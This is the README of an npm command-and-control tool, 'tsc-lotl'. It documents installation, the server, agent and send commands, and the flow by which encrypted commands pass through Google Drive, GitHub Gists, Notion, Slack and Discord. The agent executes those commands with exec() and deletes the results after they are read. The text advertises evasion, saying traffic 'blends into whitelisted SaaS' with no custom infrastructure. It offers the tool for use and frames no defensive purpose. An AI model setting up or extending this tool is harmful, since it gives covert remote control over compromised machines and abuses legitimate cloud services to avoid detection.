# tsc-lotl

Living-off-the-Land C2 — uses legitimate cloud APIs as C2 channels. Commands are AES-256-CBC encrypted, base64-wrapped, and distributed across 5 SaaS platforms. No custom listener, no suspicious ports.

## Installation

```bash
npm install -g tsc-lotl
```

## Quick Start

### Generate config template

```bash
tsc-lotl config init
```

Edit `tsc-lotl-config.json` with your API tokens.

### Start the C2 server

```bash
tsc-lotl server --config tsc-lotl-config.json
```

### Start an agent

```bash
tsc-lotl agent --config tsc-lotl-config.json --id myagent
```

### Send a command

```bash
tsc-lotl send --config tsc-lotl-config.json --channel gdrive --agent myagent --cmd "whoami"
```

### Test channels

```bash
tsc-lotl channels --config tsc-lotl-config.json
```

## Features

- **5 Living-off-the-Land channels**: Google Drive, GitHub Gists, Notion, Slack, Discord
- **AES-256-CBC encryption**: all payloads encrypted with config key before transmission
- **Auto-failover**: tries channels in priority order until one succeeds
- **Dedup per channel**: Slack and Discord track last poll timestamp — commands never re-execute
- **Result collection**: server polls GDrive and GitHub for agent results, deletes after read
- **Config-driven**: single JSON file for all tokens, channel priority, and encryption key
- **Zero custom infra**: no VPS, no domain, no open ports — traffic blends into whitelisted SaaS

## Channels

| Channel | Send Mechanism | Poll Mechanism | Result Storage |
|---------|---------------|----------------|----------------|
| **GDrive** | File upload to `.tsc_lotl_c2/` folder | Query files by agent ID name prefix, delete after read | `.tsc_lotl_results/` subfolder |
| **GitHub** | Private gist `tsc-lotl-cmd-{id}.json` | List gists, filter by prefix, delete after read | `tsc-lotl-result_{id}` gist |
| **Notion** | Database page with `agent_id`, `command`, `status=pending` | Query by agent ID + `pending` status, mark as `delivered` | Page with `status=completed` |
| **Slack** | Channel message `!c2 {id}: {payload}` | `conversations.history` with `oldest` timestamp, poll-tracked | Same channel, `!c2 result` prefix |
| **Discord** | Channel message `!c2 {id}: {payload}` | `GET /channels/{id}/messages` with `after` param, poll-tracked | Same channel, `!c2 result` prefix |

## CLI Reference

### `tsc-lotl server`

| Flag | Default | Description |
|------|---------|-------------|
| `--config` | *required* | Path to config JSON |

Starts daemon polling GDrive and GitHub for agent results every 30s. Displays decrypted command output with timestamp and channel.

### `tsc-lotl agent`

| Flag | Default | Description |
|------|---------|-------------|
| `--config` | *required* | Path to config JSON |
| `--id` | *required* | Agent identity |

Polls all configured channels every 15s for pending commands. Executes via `child_process.exec` (30s timeout) and sends results back through the same channel.

### `tsc-lotl send`

| Flag | Description |
|------|-------------|
| `--config` | Path to config JSON |
| `--channel` | Target channel (gdrive, github, notion, slack, discord) |
| `--agent` | Target agent ID |
| `--cmd` | Command to execute |

Encrypts command with AES-256-CBC, base64-encodes it, and dispatches via the specified channel.

### `tsc-lotl channels`

| Flag | Description |
|------|-------------|
| `--config` | Path to config JSON |

Tests all 5 channels and displays health status (up/down/not_configured).

### `tsc-lotl config init`

Generates `tsc-lotl-config.json` in the current directory with placeholder API keys for all channels.

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                        C2 Server                             │
│  Polls GDrive + GitHub for results every 30s                 │
│  Decrypts and displays agent command output                  │
└────────────────────┬─────────────────────────────────────────┘
                     │
     ┌───────────────┼───────────────┬───────────────┐
     ▼               ▼               ▼               ▼
  ┌──────┐      ┌────────┐      ┌───────┐      ┌────────┐
  │GDrive│      │ GitHub │      │ Notion│      │ Slack  │
  │ Files│      │ Gists  │      │  DB   │      │ Chat   │
  └──────┘      └────────┘      └───────┘      └────────┘
     ▲               ▲               ▲               ▲
     └───────────────┼───────────────┼───────────────┘
                     │
┌────────────────────┴─────────────────────────────────────────┐
│                       C2 Agent                               │
│  Polls all 5 channels every 15s for commands                  │
│  Executes commands, sends results back on same channel        │
│  AES-256-CBC encrypts all payloads                           │
└──────────────────────────────────────────────────────────────┘
```

## How It Works

1. Generate `tsc-lotl-config.json` with API tokens and a 32-char encryption key
2. **Server** starts, polls GDrive and GitHub for agent result files every 30s
3. **Agent** connects, polls all 5 channels every 15s for commands matching its ID
4. Commands are **AES-256-CBC encrypted** → base64 → stored on the channel (file, gist, DB row, or chat message)
5. Agent picks up the command, decrypts it, executes via `exec()` with 30s timeout
6. Result is **encrypted + base64** → sent back through the same channel
7. Server collects results, decrypts, and displays them
8. **Slack/Discord**: track last poll timestamp — only new messages fetched each cycle
9. **GDrive/GitHub**: result files/gists deleted after server reads them
